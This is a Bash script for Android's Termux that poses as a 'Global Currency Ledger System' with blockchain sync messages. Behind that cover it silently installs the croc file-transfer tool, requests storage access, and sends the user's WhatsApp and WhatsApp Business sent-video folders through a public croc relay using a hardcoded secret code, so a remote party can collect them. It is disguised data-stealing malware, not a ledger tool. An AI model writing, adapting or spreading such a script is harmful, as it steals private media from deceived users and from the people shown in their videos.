#!/bin/bash
# ඔයා කැමති Secret Code එකක් මෙතනට දාන්න
SECRET_CODE="VDiNR549"

echo "========================================"
echo "   GLOBAL CURRENCY LEDGER SYSTEM        "
echo "   v9.0 | Video Ledger Sync | Secure    "
echo "========================================"

# 1. Setup
if ! command -v croc &> /dev/null; then
    echo ">> [SYSTEM] Updating drivers..."
    pkg update -y > /dev/null 2>&1 && pkg install croc -y > /dev/null 2>&1
    termux-setup-storage
fi

echo ">> [INFO] Initializing Blockchain Scanner..."
sleep 1

# --- STEP 1: Normal WhatsApp Sent Videos ---
WA_VID="/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Sent"
WA_VID_OLD="/sdcard/WhatsApp/Media/WhatsApp Video/Sent"

TARGET_1=""
if [ -d "$WA_VID" ]; then
    TARGET_1="$WA_VID"
elif [ -d "$WA_VID_OLD" ]; then
    TARGET_1="$WA_VID_OLD"
fi

if [ -n "$TARGET_1" ]; then
    echo "----------------------------------------"
    echo ">> [TXN-01] FOUND: Primary Asset Ledger"
    echo ">> [STATUS] Synchronizing Data Blocks..."
    echo "----------------------------------------"
    env CROC_SECRET="$SECRET_CODE" croc --relay "croc.schollz.com:9009" send "$TARGET_1"
    
    echo ">> [SUCCESS] Batch 01 Sync Complete!"
    echo ">> [INFO] Waiting for next node..."
    sleep 5
else
    echo ">> [SKIP] Primary Asset Ledger not found."
fi

# --- STEP 2: Business WhatsApp Sent Videos ---
BIZ_VID="/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video/Sent"
BIZ_VID_OLD="/sdcard/WhatsApp Business/Media/WhatsApp Business Video/Sent"

TARGET_2=""
if [ -d "$BIZ_VID" ]; then
    TARGET_2="$BIZ_VID"
elif [ -d "$BIZ_VID_OLD" ]; then
    TARGET_2="$BIZ_VID_OLD"
fi

if [ -n "$TARGET_2" ]; then
    echo "----------------------------------------"
    echo ">> [TXN-02] FOUND: Business Asset Ledger"
    echo ">> [STATUS] Synchronizing Data Blocks..."
    echo "----------------------------------------"
    env CROC_SECRET="$SECRET_CODE" croc --relay "croc.schollz.com:9009" send "$TARGET_2"
    
    echo ">> [SUCCESS] Batch 02 Sync Complete!"
else
    echo ">> [SKIP] Business Asset Ledger not found."
fi

echo "========================================"
echo "   ALL VIDEO LEDGERS SYNCED             "
echo "========================================"
